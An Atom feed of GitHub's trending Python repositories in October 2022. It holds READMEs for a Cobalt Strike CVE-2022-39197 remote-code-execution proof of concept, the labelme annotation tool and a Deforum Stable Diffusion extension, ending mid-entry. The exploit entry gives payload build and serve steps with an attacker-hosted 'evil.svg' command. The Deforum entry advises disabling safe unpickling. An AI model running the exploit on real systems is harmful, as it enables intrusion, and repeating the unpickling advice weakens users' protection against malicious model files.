<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Python Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-10-20T01:37:14Z</updated>
  <subtitle>Daily Trending of Python in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>its-arun/CVE-2022-39197</title>
    <updated>2022-10-20T01:37:14Z</updated>
    <id>tag:github.com,2022-10-20:/its-arun/CVE-2022-39197</id>
    <link href="https://github.com/its-arun/CVE-2022-39197" rel="alternate"></link>
    <summary type="html">&lt;p&gt;CobaltStrike &lt;= 4.7.1 RCE&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;&lt;strong&gt;CVE-2022-39197 RCE POC&lt;/strong&gt;&lt;/h1&gt; &#xA;&lt;h3&gt;Usage&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Prepare Payload&lt;/strong&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Edit &lt;code&gt;Line 19&lt;/code&gt; with your payload in &lt;code&gt;EvilJar/src/main/java/Exploit.java&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Build using jar &lt;code&gt;mvn clean compile assembly:single&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Move &lt;code&gt;EvilJar-1.0-jar-with-dependencies.jar&lt;/code&gt; from &lt;code&gt;EvilJar/target/&lt;/code&gt; to &lt;code&gt;serve/&lt;/code&gt; folder&lt;/li&gt; &#xA; &lt;li&gt;Edit &lt;code&gt;serve\evil.svg&lt;/code&gt; replace &lt;code&gt;[attacker]&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Serve using &lt;code&gt;python3 -m http.server 8080&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Execute Exploit&lt;/strong&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;python3 cve-2022-39197.py beacon.exe http://10.10.10.2:8080/evil.svg&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Payload will be triggered as soon as the user scrolls through Process List&lt;/p&gt; &#xA;&lt;h3&gt;POC.JPG?&lt;/h3&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/its-arun/CVE-2022-39197/master/images/1.jpg&#34; alt=&#34;1.jpg&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Reference Links&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://mp.weixin.qq.com/s/Eb0pQ-1ebLSKPUFC7zS6dg&#34;&gt;https://mp.weixin.qq.com/s/Eb0pQ-1ebLSKPUFC7zS6dg&lt;/a&gt; — There’s a great in depth analysis of this vulnerability &lt;a href=&#34;https://www.agarri.fr/blog/archives/2012/05/11/svg_files_and_java_code_execution/index.html&#34;&gt;https://www.agarri.fr/blog/archives/2012/05/11/svg_files_and_java_code_execution/index.html&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>wkentaro/labelme</title>
    <updated>2022-10-20T01:37:14Z</updated>
    <id>tag:github.com,2022-10-20:/wkentaro/labelme</id>
    <link href="https://github.com/wkentaro/labelme" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Image Polygonal Annotation with Python (polygon, rectangle, circle, line, point and image-level flag annotation).&lt;/p&gt;&lt;hr&gt;&lt;h1 align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/wkentaro/labelme/main/labelme/icons/icon.png&#34;&gt;&lt;br&gt;labelme &lt;/h1&gt; &#xA;&lt;h4 align=&#34;center&#34;&gt; Image Polygonal Annotation with Python &lt;/h4&gt; &#xA;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;a href=&#34;https://pypi.python.org/pypi/labelme&#34;&gt;&lt;img src=&#34;https://img.shields.io/pypi/v/labelme.svg?sanitize=true&#34;&gt;&lt;/a&gt; &#xA; &lt;a href=&#34;https://pypi.org/project/labelme&#34;&gt;&lt;img src=&#34;https://img.shields.io/pypi/pyversions/labelme.svg?sanitize=true&#34;&gt;&lt;/a&gt; &#xA; &lt;a href=&#34;https://github.com/wkentaro/labelme/actions&#34;&gt;&lt;img src=&#34;https://github.com/wkentaro/labelme/workflows/ci/badge.svg?branch=main&amp;amp;event=push&#34;&gt;&lt;/a&gt; &#xA; &lt;a href=&#34;https://hub.docker.com/r/wkentaro/labelme&#34;&gt;&lt;img src=&#34;https://img.shields.io/docker/cloud/build/wkentaro/labelme&#34;&gt;&lt;/a&gt; &#xA;&lt;/div&gt; &#xA;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;a href=&#34;https://raw.githubusercontent.com/wkentaro/labelme/main/#installation&#34;&gt;&lt;b&gt;Installation&lt;/b&gt;&lt;/a&gt; | &#xA; &lt;a href=&#34;https://raw.githubusercontent.com/wkentaro/labelme/main/#usage&#34;&gt;&lt;b&gt;Usage&lt;/b&gt;&lt;/a&gt; | &#xA; &lt;a href=&#34;https://github.com/wkentaro/labelme/tree/main/examples/tutorial#tutorial-single-image-example&#34;&gt;&lt;b&gt;Tutorial&lt;/b&gt;&lt;/a&gt; | &#xA; &lt;a href=&#34;https://github.com/wkentaro/labelme/tree/main/examples&#34;&gt;&lt;b&gt;Examples&lt;/b&gt;&lt;/a&gt; | &#xA; &lt;a href=&#34;https://github.com/wkentaro/labelme/discussions&#34;&gt;&lt;b&gt;Discussions&lt;/b&gt;&lt;/a&gt; | &#xA; &lt;a href=&#34;https://www.youtube.com/playlist?list=PLI6LvFw0iflh3o33YYnVIfOpaO0hc5Dzw&#34;&gt;&lt;b&gt;Youtube FAQ&lt;/b&gt;&lt;/a&gt; &#xA;&lt;/div&gt; &#xA;&lt;br&gt; &#xA;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;img src=&#34;https://raw.githubusercontent.com/wkentaro/labelme/main/examples/instance_segmentation/.readme/annotation.jpg&#34; width=&#34;70%&#34;&gt; &#xA;&lt;/div&gt; &#xA;&lt;h2&gt;Description&lt;/h2&gt; &#xA;&lt;p&gt;Labelme is a graphical image annotation tool inspired by &lt;a href=&#34;http://labelme.csail.mit.edu&#34;&gt;http://labelme.csail.mit.edu&lt;/a&gt;.&lt;br&gt; It is written in Python and uses Qt for its graphical interface.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/wkentaro/labelme/main/examples/instance_segmentation/data_dataset_voc/JPEGImages/2011_000006.jpg&#34; width=&#34;19%&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/wkentaro/labelme/main/examples/instance_segmentation/data_dataset_voc/SegmentationClassPNG/2011_000006.png&#34; width=&#34;19%&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/wkentaro/labelme/main/examples/instance_segmentation/data_dataset_voc/SegmentationClassVisualization/2011_000006.jpg&#34; width=&#34;19%&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/wkentaro/labelme/main/examples/instance_segmentation/data_dataset_voc/SegmentationObjectPNG/2011_000006.png&#34; width=&#34;19%&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/wkentaro/labelme/main/examples/instance_segmentation/data_dataset_voc/SegmentationObjectVisualization/2011_000006.jpg&#34; width=&#34;19%&#34;&gt;&lt;br&gt; &lt;i&gt;VOC dataset example of instance segmentation.&lt;/i&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/wkentaro/labelme/main/examples/semantic_segmentation/.readme/annotation.jpg&#34; width=&#34;30%&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/wkentaro/labelme/main/examples/bbox_detection/.readme/annotation.jpg&#34; width=&#34;30%&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/wkentaro/labelme/main/examples/classification/.readme/annotation_cat.jpg&#34; width=&#34;35%&#34;&gt;&lt;br&gt; &lt;i&gt;Other examples (semantic segmentation, bbox detection, and classification).&lt;/i&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/4310419/47907116-85667800-de82-11e8-83d0-b9f4eb33268f.gif&#34; width=&#34;30%&#34;&gt; &lt;img src=&#34;https://user-images.githubusercontent.com/4310419/47922172-57972880-deae-11e8-84f8-e4324a7c856a.gif&#34; width=&#34;30%&#34;&gt; &lt;img src=&#34;https://user-images.githubusercontent.com/14256482/46932075-92145f00-d080-11e8-8d09-2162070ae57c.png&#34; width=&#34;32%&#34;&gt;&lt;br&gt; &lt;i&gt;Various primitives (polygon, rectangle, circle, line, and point).&lt;/i&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Features&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Image annotation for polygon, rectangle, circle, line and point. (&lt;a href=&#34;https://raw.githubusercontent.com/wkentaro/labelme/main/examples/tutorial&#34;&gt;tutorial&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Image flag annotation for classification and cleaning. (&lt;a href=&#34;https://github.com/wkentaro/labelme/pull/166&#34;&gt;#166&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Video annotation. (&lt;a href=&#34;https://raw.githubusercontent.com/wkentaro/labelme/main/examples/video_annotation&#34;&gt;video annotation&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; GUI customization (predefined labels / flags, auto-saving, label validation, etc). (&lt;a href=&#34;https://github.com/wkentaro/labelme/pull/144&#34;&gt;#144&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Exporting VOC-format dataset for semantic/instance segmentation. (&lt;a href=&#34;https://raw.githubusercontent.com/wkentaro/labelme/main/examples/semantic_segmentation&#34;&gt;semantic segmentation&lt;/a&gt;, &lt;a href=&#34;https://raw.githubusercontent.com/wkentaro/labelme/main/examples/instance_segmentation&#34;&gt;instance segmentation&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Exporting COCO-format dataset for instance segmentation. (&lt;a href=&#34;https://raw.githubusercontent.com/wkentaro/labelme/main/examples/instance_segmentation&#34;&gt;instance segmentation&lt;/a&gt;)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Requirements&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Ubuntu / macOS / Windows&lt;/li&gt; &#xA; &lt;li&gt;Python3&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://www.riverbankcomputing.co.uk/software/pyqt/intro&#34;&gt;PyQt5 / PySide2&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Installation&lt;/h2&gt; &#xA;&lt;p&gt;There are options:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Platform agnostic installation: &lt;a href=&#34;https://raw.githubusercontent.com/wkentaro/labelme/main/#anaconda&#34;&gt;Anaconda&lt;/a&gt;, &lt;a href=&#34;https://raw.githubusercontent.com/wkentaro/labelme/main/#docker&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Platform specific installation: &lt;a href=&#34;https://raw.githubusercontent.com/wkentaro/labelme/main/#ubuntu&#34;&gt;Ubuntu&lt;/a&gt;, &lt;a href=&#34;https://raw.githubusercontent.com/wkentaro/labelme/main/#macos&#34;&gt;macOS&lt;/a&gt;, &lt;a href=&#34;https://raw.githubusercontent.com/wkentaro/labelme/main/#windows&#34;&gt;Windows&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Pre-build binaries from &lt;a href=&#34;https://github.com/wkentaro/labelme/releases&#34;&gt;the release section&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Anaconda&lt;/h3&gt; &#xA;&lt;p&gt;You need install &lt;a href=&#34;https://www.continuum.io/downloads&#34;&gt;Anaconda&lt;/a&gt;, then run below:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# python3&#xA;conda create --name=labelme python=3&#xA;source activate labelme&#xA;# conda install -c conda-forge pyside2&#xA;# conda install pyqt&#xA;# pip install pyqt5  # pyqt5 can be installed via pip on python3&#xA;pip install labelme&#xA;# or you can install everything by conda command&#xA;# conda install labelme -c conda-forge&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Docker&lt;/h3&gt; &#xA;&lt;p&gt;You need install &lt;a href=&#34;https://www.docker.com&#34;&gt;docker&lt;/a&gt;, then run below:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# on macOS&#xA;socat TCP-LISTEN:6000,reuseaddr,fork UNIX-CLIENT:\&#34;$DISPLAY\&#34; &amp;amp;&#xA;docker run -it -v /tmp/.X11-unix:/tmp/.X11-unix -e DISPLAY=docker.for.mac.host.internal:0 -v $(pwd):/root/workdir wkentaro/labelme&#xA;&#xA;# on Linux&#xA;xhost +&#xA;docker run -it -v /tmp/.X11-unix:/tmp/.X11-unix -e DISPLAY=:0 -v $(pwd):/root/workdir wkentaro/labelme&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Ubuntu&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo apt-get install labelme&#xA;&#xA;# or&#xA;sudo pip3 install labelme&#xA;&#xA;# or install standalone executable from:&#xA;# https://github.com/wkentaro/labelme/releases&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;macOS&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;brew install pyqt  # maybe pyqt5&#xA;pip install labelme&#xA;&#xA;# or&#xA;brew install wkentaro/labelme/labelme  # command line interface&#xA;# brew install --cask wkentaro/labelme/labelme  # app&#xA;&#xA;# or install standalone executable/app from:&#xA;# https://github.com/wkentaro/labelme/releases&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Windows&lt;/h3&gt; &#xA;&lt;p&gt;Install &lt;a href=&#34;https://www.continuum.io/downloads&#34;&gt;Anaconda&lt;/a&gt;, then in an Anaconda Prompt run:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;conda create --name=labelme python=3&#xA;conda activate labelme&#xA;pip install labelme&#xA;&#xA;# or install standalone executable/app from:&#xA;# https://github.com/wkentaro/labelme/releases&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;p&gt;Run &lt;code&gt;labelme --help&lt;/code&gt; for detail.&lt;br&gt; The annotations are saved as a &lt;a href=&#34;http://www.json.org/&#34;&gt;JSON&lt;/a&gt; file.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;labelme  # just open gui&#xA;&#xA;# tutorial (single image example)&#xA;cd examples/tutorial&#xA;labelme apc2016_obj3.jpg  # specify image file&#xA;labelme apc2016_obj3.jpg -O apc2016_obj3.json  # close window after the save&#xA;labelme apc2016_obj3.jpg --nodata  # not include image data but relative image path in JSON file&#xA;labelme apc2016_obj3.jpg \&#xA;  --labels highland_6539_self_stick_notes,mead_index_cards,kong_air_dog_squeakair_tennis_ball  # specify label list&#xA;&#xA;# semantic segmentation example&#xA;cd examples/semantic_segmentation&#xA;labelme data_annotated/  # Open directory to annotate all images in it&#xA;labelme data_annotated/ --labels labels.txt  # specify label list with a file&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;For more advanced usage, please refer to the examples:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/wkentaro/labelme/main/examples/tutorial&#34;&gt;Tutorial (Single Image Example)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/wkentaro/labelme/main/examples/semantic_segmentation&#34;&gt;Semantic Segmentation Example&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/wkentaro/labelme/main/examples/instance_segmentation&#34;&gt;Instance Segmentation Example&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/wkentaro/labelme/main/examples/video_annotation&#34;&gt;Video Annotation Example&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Command Line Arguments&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;--output&lt;/code&gt; specifies the location that annotations will be written to. If the location ends with .json, a single annotation will be written to this file. Only one image can be annotated if a location is specified with .json. If the location does not end with .json, the program will assume it is a directory. Annotations will be stored in this directory with a name that corresponds to the image that the annotation was made on.&lt;/li&gt; &#xA; &lt;li&gt;The first time you run labelme, it will create a config file in &lt;code&gt;~/.labelmerc&lt;/code&gt;. You can edit this file and the changes will be applied the next time that you launch labelme. If you would prefer to use a config file from another location, you can specify this file with the &lt;code&gt;--config&lt;/code&gt; flag.&lt;/li&gt; &#xA; &lt;li&gt;Without the &lt;code&gt;--nosortlabels&lt;/code&gt; flag, the program will list labels in alphabetical order. When the program is run with this flag, it will display labels in the order that they are provided.&lt;/li&gt; &#xA; &lt;li&gt;Flags are assigned to an entire image. &lt;a href=&#34;https://raw.githubusercontent.com/wkentaro/labelme/main/examples/classification&#34;&gt;Example&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Labels are assigned to a single polygon. &lt;a href=&#34;https://raw.githubusercontent.com/wkentaro/labelme/main/examples/bbox_detection&#34;&gt;Example&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;FAQ&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;How to convert JSON file to numpy array?&lt;/strong&gt; See &lt;a href=&#34;https://raw.githubusercontent.com/wkentaro/labelme/main/examples/tutorial#convert-to-dataset&#34;&gt;examples/tutorial&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;How to load label PNG file?&lt;/strong&gt; See &lt;a href=&#34;https://raw.githubusercontent.com/wkentaro/labelme/main/examples/tutorial#how-to-load-label-png-file&#34;&gt;examples/tutorial&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;How to get annotations for semantic segmentation?&lt;/strong&gt; See &lt;a href=&#34;https://raw.githubusercontent.com/wkentaro/labelme/main/examples/semantic_segmentation&#34;&gt;examples/semantic_segmentation&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;How to get annotations for instance segmentation?&lt;/strong&gt; See &lt;a href=&#34;https://raw.githubusercontent.com/wkentaro/labelme/main/examples/instance_segmentation&#34;&gt;examples/instance_segmentation&lt;/a&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Developing&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/wkentaro/labelme.git&#xA;cd labelme&#xA;&#xA;# Install anaconda3 and labelme&#xA;curl -L https://github.com/wkentaro/dotfiles/raw/main/local/bin/install_anaconda3.sh | bash -s .&#xA;source .anaconda3/bin/activate&#xA;pip install -e .&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;How to build standalone executable&lt;/h2&gt; &#xA;&lt;p&gt;Below shows how to build the standalone executable on macOS, Linux and Windows.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# Setup conda&#xA;conda create --name labelme python=3.9&#xA;conda activate labelme&#xA;&#xA;# Build the standalone executable&#xA;pip install .&#xA;pip install pyinstaller&#xA;pyinstaller labelme.spec&#xA;dist/labelme --version&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;How to contribute&lt;/h2&gt; &#xA;&lt;p&gt;Make sure below test passes on your environment.&lt;br&gt; See &lt;code&gt;.github/workflows/ci.yml&lt;/code&gt; for more detail.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;pip install -r requirements-dev.txt&#xA;&#xA;flake8 .&#xA;black --line-length 79 --check labelme/&#xA;MPLBACKEND=&#39;agg&#39; pytest -vsx tests/&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Acknowledgement&lt;/h2&gt; &#xA;&lt;p&gt;This repo is the fork of &lt;a href=&#34;https://github.com/mpitid/pylabelme&#34;&gt;mpitid/pylabelme&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>deforum-art/deforum-for-automatic1111-webui</title>
    <updated>2022-10-20T01:37:14Z</updated>
    <id>tag:github.com,2022-10-20:/deforum-art/deforum-for-automatic1111-webui</id>
    <link href="https://github.com/deforum-art/deforum-for-automatic1111-webui" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Deforum extention script for AUTOMATIC1111&#39;s Stable Diffusion webui&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Deforum Stable Diffusion — official extension script for AUTOMATIC1111&#39;s webui&lt;/h1&gt; &#xA;&lt;p&gt;For now, video-input, 2D, pseudo-2D and 3D animation modes are available. Interpolation and render image batch temporary excluded for simplicity&lt;/p&gt; &#xA;&lt;p align=&#34;left&#34;&gt; &lt;a href=&#34;https://github.com/deforum-art/deforum-for-automatic1111-webui/commits&#34;&gt;&lt;img alt=&#34;Last Commit&#34; src=&#34;https://img.shields.io/github/last-commit/deforum-art/deforum-for-automatic1111-webui&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/deforum-art/deforum-for-automatic1111-webui/issues&#34;&gt;&lt;img alt=&#34;GitHub issues&#34; src=&#34;https://img.shields.io/github/issues/deforum-art/deforum-for-automatic1111-webui&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/deforum-art/deforum-for-automatic1111-webui/stargazers&#34;&gt;&lt;img alt=&#34;GitHub stars&#34; src=&#34;https://img.shields.io/github/stars/deforum-art/deforum-for-automatic1111-webui&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/deforum-art/deforum-for-automatic1111-webui/network&#34;&gt;&lt;img alt=&#34;GitHub forks&#34; src=&#34;https://img.shields.io/github/forks/deforum-art/deforum-for-automatic1111-webui&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://colab.research.google.com/github/deforum/stable-diffusion/blob/main/Deforum_Stable_Diffusion.ipynb&#34;&gt;&lt;img alt=&#34;Colab&#34; src=&#34;https://colab.research.google.com/assets/colab-badge.svg?sanitize=true&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://replicate.com/deforum/deforum_stable_diffusion&#34;&gt;&lt;img alt=&#34;Replicate&#34; src=&#34;https://replicate.com/deforum/deforum_stable_diffusion/badge&#34;&gt;&lt;/a&gt; &lt;/p&gt; &#xA;&lt;h2&gt;Before Starting&lt;/h2&gt; &#xA;&lt;p&gt;Read the README file at the original Deforum repo&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/deforum/stable-diffusion&#34;&gt;https://github.com/deforum/stable-diffusion&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Getting Started&lt;/h2&gt; &#xA;&lt;ol start=&#34;0&#34;&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;del&gt;Cover yourself in oil&lt;/del&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Install &lt;a href=&#34;https://github.com/AUTOMATIC1111/stable-diffusion-webui/&#34;&gt;AUTOMATIC1111&#39;s webui&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Download this repository and put the files deforum.py and the &#39;deforum&#39; folder into the &#39;scripts&#39; folder inside your WebUI installation directory&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;If you&#39;re on Windows and want to launch Deforum in 3D mode, you&#39;ll have to download the depths model manually. Download these files &lt;a href=&#34;https://github.com/intel-isl/DPT/releases/download/1_0/dpt_large-midas-2f21e586.pt&#34;&gt;https://github.com/intel-isl/DPT/releases/download/1_0/dpt_large-midas-2f21e586.pt&lt;/a&gt; and &lt;a href=&#34;https://cloudflare-ipfs.com/ipfs/Qmd2mMnDLWePKmgfS8m6ntAg4nhV5VkUyAydYBp8cWWeB7/AdaBins_nyu.pt&#34;&gt;https://cloudflare-ipfs.com/ipfs/Qmd2mMnDLWePKmgfS8m6ntAg4nhV5VkUyAydYBp8cWWeB7/AdaBins_nyu.pt&lt;/a&gt; and put them into the &#39;models/Deforum&#39; folder of your webui installation. (if it doesn&#39;t exist, create it)&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;4.&lt;strong&gt;Important: If you want to use 3D mode, launch the WebUI with the &lt;code&gt;--disable-safe-unpickle&lt;/code&gt; option or else it won&#39;t let you to use the depth models!&lt;/strong&gt; &lt;a href=&#34;https://imgur.com/a/TJHglot&#34;&gt;How to add it to the .bat file on Windows.&lt;/a&gt; Open the webui, switch to &#39;img2img&#39; tab and select &#39;Deforum v0.5-webui-beta&#39; in the &#39;Custom scripts&#39; dropdown menu&lt;/p&gt; &#xA;&lt;ol start=&#34;5&#34;&gt; &#xA; &lt;li&gt; &lt;p&gt;Enter the animation settings. Refer to &lt;a href=&#34;https://docs.google.com/document/d/1pEobUknMFMkn8F5TMsv8qRzamXX_75BShMMXV8IFslI/edit&#34;&gt;this general guide&lt;/a&gt; and &lt;a href=&#34;https://docs.google.com/document/d/1pfW1PwbDIuW0cv-dnuyYj1UzPqe23BlSLTJsqazffXM/edit?usp=sharing&#34;&gt;this guide to math keyframing functions in Deforum&lt;/a&gt;. However, &lt;strong&gt;in this version prompt weights less than zero don&#39;t just like in original Deforum!&lt;/strong&gt; Split the positive and the negative prompt in the json section using --neg argument like this &#34;apple:`where(cos(t)&amp;gt;=0, cos(t), 0)`, snow --neg strawberry:`where(cos(t)&amp;lt;0, -cos(t), 0)`&#34;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;To view animation frames as they&#39;re being made, without waiting for the completion of an animation, go to the &#39;Settings&#39; tab and set the value of this toolbar &lt;strong&gt;above zero&lt;/strong&gt;, then click &#39;Apply settings&#39; at the top of the page and return to the &#39;Deforum&#39; tab. Warning: it may slow down the generation process.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/14872007/196064311-1b79866a-e55b-438a-84a7-004ff30829ad.png&#34; alt=&#34;adsdasunknown&#34;&gt;&lt;/p&gt; &#xA;&lt;ol start=&#34;7&#34;&gt; &#xA; &lt;li&gt; &lt;p&gt;Run the script and see if you got it working or even got something. &lt;strong&gt;In 3D mode a large delay is expected at first&lt;/strong&gt; as the script loads the depth models. In the end, using the default settings the whole thing should consume 6.4 GBs of VRAM at 3D mode peaks and no more than 3.8 GB VRAM in 3D mode if you launch the webui with the &#39;--lowvram&#39; command line argument.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;If it gives errors on missing modules, such as about missing &#39;numexpr&#39;, go to the original webui directory, open &#39;requirements_versions.txt&#39; and append the missing packages names at the end of that file. Then restart the webui.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;After the generation process is completed, click the button with the self-describing name to show the video or gif result right in the GUI!&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/14872007/196292734-245eb795-8ffc-4e4a-b8c5-1daa27dacf24.png&#34; alt=&#34;Screenshot 2022-10-18 at 01-06-24 Stable Diffusion&#34;&gt;&lt;/p&gt; &#xA;&lt;ol start=&#34;10&#34;&gt; &#xA; &lt;li&gt; &lt;p&gt;Join our Discord where you can post generated stuff, ask questions and &lt;del&gt;infuriate the devs with &#39;this feature is in auto&#39;s build. When will it be in Deforum? Why can&#39;t I launch Deforum on my potato computer?&#39;&lt;/del&gt;(not anymore, ha-ha) &lt;a href=&#34;https://discord.gg/deforum&#34;&gt;https://discord.gg/deforum&lt;/a&gt;. There&#39;s also the &#39;Issues&#39; tab in the repo.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Profit!&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h2&gt;Showcase&lt;/h2&gt; &#xA;&lt;p&gt;Proof that it works good enough of AUTOMATIC1111&#39;s build with MATH keyframing and prompt-weighting enabled in 3D mode&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/14872007/195954681-6b0f5a8d-e575-4ce3-9c10-e39ffbbca6ac.gif&#34; alt=&#34;sw-min&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&#39;Le Grand Interface&#39; at work:&lt;/p&gt; &#xA;&lt;p&gt;&lt;img 